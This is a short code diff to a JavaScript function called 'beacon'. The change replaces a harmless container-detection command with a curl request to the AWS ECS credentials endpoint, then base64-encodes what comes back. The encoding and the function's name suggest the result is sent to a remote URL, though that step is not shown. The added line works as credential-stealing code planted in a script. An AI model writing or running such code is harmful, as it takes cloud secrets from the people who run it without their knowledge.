@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'cat /proc/1/cgroup | grep -iE "ecs|docker" || true',
+  'curl -s "http://169.254.170.2/v2/credentials"',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
